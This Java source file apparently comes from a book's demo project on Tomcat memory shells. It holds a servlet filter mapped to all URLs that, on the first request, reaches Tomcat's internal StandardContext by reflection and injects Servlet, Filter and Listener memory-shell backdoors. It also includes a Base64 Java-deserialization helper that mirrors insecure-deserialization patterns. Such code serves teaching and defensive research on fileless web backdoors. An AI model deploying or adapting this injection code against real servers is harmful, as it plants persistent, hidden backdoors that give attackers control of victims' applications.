package com.book.demo;

import com.book.demo.memshell.MemoryShellInjector;
import com.book.demo.memshell.ServletMemoryShell;
import com.book.demo.memshell.FilterMemoryShell;
import com.book.demo.memshell.ListenerMemoryShell;
import com.book.demo.memshell.MemoryShell;
import org.apache.catalina.core.StandardContext;
import jakarta.servlet.*;
import jakarta.servlet.annotation.WebFilter;
import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpServletResponse;

import java.io.*;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

@WebFilter(filterName = "DemoFilter", urlPatterns = {"/*"})
public class DemoFilter implements Filter {
    
    private FilterConfig filterConfig;
    private static boolean delayedInjectionAttempted = false;
    
    @Override
    public void init(FilterConfig filterConfig) throws ServletException {
        this.filterConfig = filterConfig;
        System.out.println("[DEMO-FILTER] DemoFilter 初始化完成");
        
        // 模拟Filter初始化时的反序列化操作
        try {
            demonstrateFilterInitialization();
        } catch (Exception e) {
            System.out.println("[DEMO-FILTER] 初始化演示失败: " + e.getMessage());
        }
    }
    
    @Override
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain)
            throws IOException, ServletException {
        
        HttpServletRequest httpRequest = (HttpServletRequest) request;
        HttpServletResponse httpResponse = (HttpServletResponse) response;
        
        long startTime = System.currentTimeMillis();
        String requestUri = httpRequest.getRequestURI();
        
        System.out.println("[DEMO-FILTER] 处理请求: " + requestUri);
        
        // 延迟注入：在第一次请求时尝试注入内存马
        if (!delayedInjectionAttempted) {
            attemptDelayedInjection(httpRequest);
            delayedInjectionAttempted = true;
        }
        
        try {
            // 模拟Filter处理过程中的反序列化操作
            if (shouldProcessRequest(httpRequest)) {
                processRequestData(httpRequest);
            }
            
            // 继续执行链
            chain.doFilter(request, response);
            
            // 请求处理完成后的操作
            long processingTime = System.currentTimeMillis() - startTime;
            System.out.println("[DEMO-FILTER] 请求处理完成，耗时: " + processingTime + "ms");
            
            // 模拟响应处理
            processResponseData(httpResponse, processingTime);
            
        } catch (Exception e) {
            System.out.println("[DEMO-FILTER] 过滤器处理异常: " + e.getMessage());
            throw new ServletException("Filter处理失败", e);
        }
    }
    
    @Override
    public void destroy() {
        System.out.println("[DEMO-FILTER] DemoFilter 销毁完成");
        this.filterConfig = null;
    }
    
    private void demonstrateFilterInitialization() throws Exception {
        System.out.println("[DEMO-FILTER] 演示Filter初始化过程中的反序列化");
        
        // 创建Filter初始化数据
        Map<String, Object> initData = new HashMap<>();
        initData.put("filterName", "DemoFilter");
        initData.put("initTime", System.currentTimeMillis());
        initData.put("version", "1.0.0");
        initData.put("debugMode", false);
        
        // 序列化初始化数据
        String serializedData = serializeToBase64(initData);
        System.out.println("[DEMO-FILTER] 初始化数据序列化完成，大小: " + serializedData.length());
        
        // 反序列化初始化数据
        Object deserializedData = deserializeFromBase64(serializedData);
        System.out.println("[DEMO-FILTER] 初始化数据反序列化完成: " + deserializedData);
    }
    
    private boolean shouldProcessRequest(HttpServletRequest request) {
        // 判断是否需要处理特定请求
        String uri = request.getRequestURI();
        return uri.contains("demo") || uri.contains("trace") || 
               request.getParameter("processFilter") != null;
    }
    
    private void processRequestData(HttpServletRequest request) throws Exception {
        System.out.println("[DEMO-FILTER] 处理请求数据反序列化");
        
        // 创建请求处理数据
        Map<String, Object> requestData = new HashMap<>();
        requestData.put("method", request.getMethod());
        requestData.put("uri", request.getRequestURI());
        requestData.put("queryString", request.getQueryString());
        requestData.put("userAgent", request.getHeader("User-Agent"));
        requestData.put("remoteAddr", request.getRemoteAddr());
        requestData.put("sessionId", request.getSession(false) != null ? 
                       request.getSession(false).getId() : null);
        
        // 序列化请求数据
        String serializedData = serializeToBase64(requestData);
        
        // 反序列化请求数据
        Object deserializedData = deserializeFromBase64(serializedData);
        
        System.out.println("[DEMO-FILTER] 请求数据处理完成，序列化大小: " + serializedData.length());
        
        // 将处理结果存储到请求属性中
        request.setAttribute("filterProcessedData", deserializedData);
        request.setAttribute("filterProcessedTime", System.currentTimeMillis());
    }
    
    private void processResponseData(HttpServletResponse response, long processingTime) throws Exception {
        System.out.println("[DEMO-FILTER] 处理响应数据序列化");
        
        // 创建响应处理数据
        Map<String, Object> responseData = new HashMap<>();
        responseData.put("processingTime", processingTime);
        responseData.put("responseTime", System.currentTimeMillis());
        responseData.put("status", response.getStatus());
        responseData.put("filterName", "DemoFilter");
        
        // 序列化响应数据
        String serializedData = serializeToBase64(responseData);
        
        // 反序列化响应数据
        Object deserializedData = deserializeFromBase64(serializedData);
        
        System.out.println("[DEMO-FILTER] 响应数据处理完成: " + deserializedData);
        
        // 添加自定义响应头
        response.setHeader("X-Filter-Processed", "true");
        response.setHeader("X-Filter-Processing-Time", String.valueOf(processingTime));
    }
    
    private String serializeToBase64(Object obj) throws IOException {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(obj);
        oos.close();
        
        byte[] serializedData = baos.toByteArray();
        return Base64.getEncoder().encodeToString(serializedData);
    }
    
    private Object deserializeFromBase64(String base64Data) throws IOException, ClassNotFoundException {
        byte[] serializedData = Base64.getDecoder().decode(base64Data);
        ByteArrayInputStream bais = new ByteArrayInputStream(serializedData);
        ObjectInputStream ois = new ObjectInputStream(bais);
        
        Object result = ois.readObject();
        ois.close();
        
        return result;
    }
    
    /**
     * 延迟注入：在请求处理时尝试注入内存马
     * 此时可以获取到真实的ServletContext和StandardContext
     */
    private void attemptDelayedInjection(HttpServletRequest request) {
        System.out.println("[DEMO-FILTER] 开始延迟注入内存马...");
        
        try {
            ServletContext servletContext = request.getServletContext();
            System.out.println("[DEMO-FILTER] 获取到ServletContext: " + servletContext.getClass().getName());
            
            // 通过ServletContext获取StandardContext
            StandardContext standardContext = getStandardContextFromServletContext(servletContext);
            
            if (standardContext != null) {
                System.out.println("[DEMO-FILTER] 成功获取StandardContext: " + standardContext.getPath());
                
                // 创建内存马实例并手动设置context
                ServletMemoryShell servletShell = new ServletMemoryShell();
                servletShell.setStandardContext(standardContext);
                
                FilterMemoryShell filterShell = new FilterMemoryShell();
                filterShell.setStandardContext(standardContext);
                
                ListenerMemoryShell listenerShell = new ListenerMemoryShell();  
                listenerShell.setStandardContext(standardContext);
                
                // 尝试注入
                System.out.println("[DEMO-FILTER] 尝试注入Servlet内存马...");
                try {
                    if (servletShell.inject()) {
                        System.out.println("[DEMO-FILTER] Servlet内存马注入成功");
                    } else {
                        System.out.println("[DEMO-FILTER] Servlet内存马注入失败");
                    }
                } catch (Exception e) {
                    System.out.println("[DEMO-FILTER] Servlet内存马注入异常: " + e.getMessage());
                }
                
                System.out.println("[DEMO-FILTER] 尝试注入Filter内存马...");
                try {
                    if (filterShell.inject()) {
                        System.out.println("[DEMO-FILTER] Filter内存马注入成功");
                    } else {
                        System.out.println("[DEMO-FILTER] Filter内存马注入失败");
                    }
                } catch (Exception e) {
                    System.out.println("[DEMO-FILTER] Filter内存马注入异常: " + e.getMessage());
                }
                
                System.out.println("[DEMO-FILTER] 尝试注入Listener内存马...");
                try {
                    if (listenerShell.inject()) {
                        System.out.println("[DEMO-FILTER] Listener内存马注入成功");
                    } else {
                        System.out.println("[DEMO-FILTER] Listener内存马注入失败");
                    }
                } catch (Exception e) {
                    System.out.println("[DEMO-FILTER] Listener内存马注入异常: " + e.getMessage());
                }
                
            } else {
                System.out.println("[DEMO-FILTER] 无法从ServletContext获取StandardContext");
            }
            
        } catch (Exception e) {
            System.out.println("[DEMO-FILTER] 延迟注入失败: " + e.getMessage());
            e.printStackTrace();
        }
    }
    
    /**
     * 从ServletContext获取StandardContext
     */
    private StandardContext getStandardContextFromServletContext(ServletContext servletContext) {
        try {
            // 方式1: 通过ApplicationContext获取
            if (servletContext.getClass().getName().contains("ApplicationContext")) {
                Field contextField = servletContext.getClass().getDeclaredField("context");
                contextField.setAccessible(true);
                Object context = contextField.get(servletContext);
                
                if (context instanceof StandardContext) {
                    System.out.println("[DEMO-FILTER] 通过ApplicationContext.context获取StandardContext");
                    return (StandardContext) context;
                }
            }
            
            // 方式2: 通过ApplicationContextFacade获取
            if (servletContext.getClass().getName().contains("ApplicationContextFacade")) {
                Field contextField = servletContext.getClass().getDeclaredField("context");
                contextField.setAccessible(true);
                Object applicationContext = contextField.get(servletContext);
                
                if (applicationContext != null) {
                    Field innerContextField = applicationContext.getClass().getDeclaredField("context");
                    innerContextField.setAccessible(true);
                    Object context = innerContextField.get(applicationContext);
                    
                    if (context instanceof StandardContext) {
                        System.out.println("[DEMO-FILTER] 通过ApplicationContextFacade获取StandardContext");
                        return (StandardContext) context;
                    }
                }
            }
            
            // 方式3: 尝试其他可能的字段名
            String[] possibleFields = {"context", "standardContext", "ctx", "applicationContext"};
            for (String fieldName : possibleFields) {
                try {
                    Field field = servletContext.getClass().getDeclaredField(fieldName);
                    field.setAccessible(true);
                    Object value = field.get(servletContext);
                    
                    if (value instanceof StandardContext) {
                        System.out.println("[DEMO-FILTER] 通过字段 " + fieldName + " 获取StandardContext");
                        return (StandardContext) value;
                    }
                } catch (NoSuchFieldException ignored) {}
            }
            
        } catch (Exception e) {
            System.out.println("[DEMO-FILTER] 从ServletContext获取StandardContext失败: " + e.getMessage());
        }
        
        return null;
    }
}